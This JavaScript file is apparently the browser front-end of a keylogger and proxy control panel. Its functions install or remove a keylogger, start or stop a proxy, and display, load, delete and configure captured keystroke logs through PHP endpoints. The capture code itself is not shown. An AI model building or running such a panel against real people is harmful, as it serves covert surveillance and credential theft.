var auto_refresh;
var showDots;

var showLoadingDots = function() {
    clearInterval(showDots);
	
	if (!$("#loadingDots").length>0) return false;
    showDots = setInterval(function(){            
        var d = $("#loadingDots");
        d.text().length >= 3 ? d.text('') : d.append('.');
    },300);
}

function init() {

	refresh();
	refresh_history();
	refresh_config();
	
	$("#tabs ul").idTabs();
		
    $("#auto_refresh").toggle(function() {
			$("#auto_refresh").html('<font color="lime">On</font>');
			$('#auto_time').attr('disabled', 'disabled');
			
			auto_refresh = setInterval(
			function ()
			{
				refresh();
			},
			$("#auto_time").val());
		}, function() {
			$("#auto_refresh").html('<font color="red">Off</font>');
			$('#auto_time').removeAttr('disabled');
				
            clearInterval(auto_refresh);
			auto_refresh = null;
		});	
}

function keylogger_toggle(action) {
	$('#output').load('keylogger_actions.php?keylogger&'+action);

	if(action == 'remove') {
		$("#keylogger_link").html('<strong>Install</strong>');
		$("#keylogger_status").html('<font color="red"><strong>not installed</strong></font>');
		$("#keylogger_link").attr("href", "javascript:keylogger_toggle('set');");
		$('#output').val('Keylogger has been uninstalled...');
	}
	else {
		$("#keylogger_link").html('<strong>Uninstall</strong>');
		$("#keylogger_status").html('<font color="lime"><strong>installed</strong></font>');
		$("#keylogger_link").attr("href", "javascript:keylogger_toggle('remove');");
		$('#output').val('Keylogger is installed...');
	}
}

function proxy_toggle(action) {
	$('#output').load('keylogger_actions.php?proxy&'+action);

	if(action == 'stop') {
		$("#proxy_link").html('<strong>Start</strong>');
		$("#proxy_status").html('<font color="red"><strong>disabled</strong></font>');
		$("#proxy_link").attr("href", "javascript:proxy_toggle('start');");
		$('#output').val('Proxy has been stopped...');
	}
	else {
		$("#proxy_link").html('<strong>Stop</strong>');
		$("#proxy_status").html('<font color="lime"><strong>enabled</strong></font>');
		$("#proxy_link").attr("href", "javascript:proxy_toggle('stop');");
		$('#output').val('Proxy is running...');
	}
}

function clean() {
	if(auto_refresh == null) {
		$("#refresh_text").html('<em>Loading<span id="loadingDots"></span></em>'); 
		showLoadingDots();
	}
	
	$.ajax({
		type: "GET",
		data: "clean",
		url: "keylogger_actions.php",
		success: function(msg){
			$("#refresh_text").html('<font color="lime"><strong>cleaned</strong></font>'); clearInterval(showDots);
			refresh();
			refresh_history();
		}
	});
}

function refresh() {
	if(auto_refresh == null) {
		$("#refresh_text").html('<em>Loading<span id="loadingDots"></span></em>'); 
		showLoadingDots();
	}

	$.ajax({
		type: "GET",
		data: "lastlog",
		url: "keylogger_data.php",
		success: function(msg){
			$("#output").val(msg).scrollTop($("#output")[0].scrollHeight - $("#output").height());
			$("#refresh_text").html(''); clearInterval(showDots);
		}
	});
}

function refresh_history() {
	$("#refresh_text").html('<em>Loading<span id="loadingDots"></span></em>'); 
	showLoadingDots();
	
	$.ajax({
		type: "GET",
		data: "history",
		url: "keylogger_data.php",
		success: function(msg){
			$("#content").html(msg);
			$("#refresh_text").html(''); clearInterval(showDots);
		}
	});
}

function showTab()
{
	$("#Output").show(); 
	$("#History").hide();
	$("#History_link").removeClass("selected"); 
	$("#Output_link").addClass("selected");
}

function delete_file(what) {
	$("#refresh_text").html('<em>Loading<span id="loadingDots"></span></em>'); 
	showLoadingDots();
	
	$.ajax({
		type: "GET",
		data: "delete&file=" + what,
		url: "keylogger_actions.php",
		success: function(msg){
			$("#content").html(msg);
			refresh_history();
			$("#refresh_text").html(''); clearInterval(showDots);
		}
	});
}

function load_file(what) {
	$("#refresh_text").html('<em>Loading<span id="loadingDots"></span></em>'); 
	showLoadingDots();
	
	$.ajax({
		type: "GET",
		data: "load&file=" + what,
		url: "keylogger_actions.php",
		success: function(msg){
			$("#output").val(msg);
			showTab();
			$("#refresh_text").html(''); clearInterval(showDots);
		}
	});
}

function refresh_config() {
	$("#refresh_text").html('<em>Loading<span id="loadingDots"></span></em>'); 
	showLoadingDots();
	
	$.ajax({
		type: "GET",
		data: "get_conf",
		url: "keylogger_conf.php",
		success: function(msg){
			$("#content_conf").html(msg);
			$("#refresh_text").html(''); clearInterval(showDots);
		}
	});
}

function set_config() {
	$("#refresh_text").html('<em>Loading<span id="loadingDots"></span></em>'); 
	showLoadingDots();
	
	$.ajax({
		type: "POST",
		data: $("#form_conf").serialize(),
		url: "keylogger_conf.php",
		success: function(msg){
			$("#refresh_text").html('<font color="lime"><b>saved</b></font>'); clearInterval(showDots);
			keylogger_toggle('remove');
			proxy_toggle('stop');
			$('#output').val('Configuration has been saved.');
			
			setTimeout(
			  function() 
			  {
			    location.reload(true);
			  }, 2500);
		}
	});
}

function reload() {
	location.reload(true);
}

function install() {
	$("#refresh_text").html('<em>Installing<span id="loadingDots"></span></em>'); 
	showLoadingDots();
	
	$.ajax({
		type: "GET",
		data: "install_dep",
		url: "keylogger_actions.php",
		cache: false,
		success: function(msg){
		}
	});

    var loop=self.setInterval(
	function ()
	{
	    $.ajax({
			url: 'status.php',
			cache: false,
			success: function(msg){
				if(msg != 'working')
				{
					reload();
				}
			}
		});
	}
	,5000);
}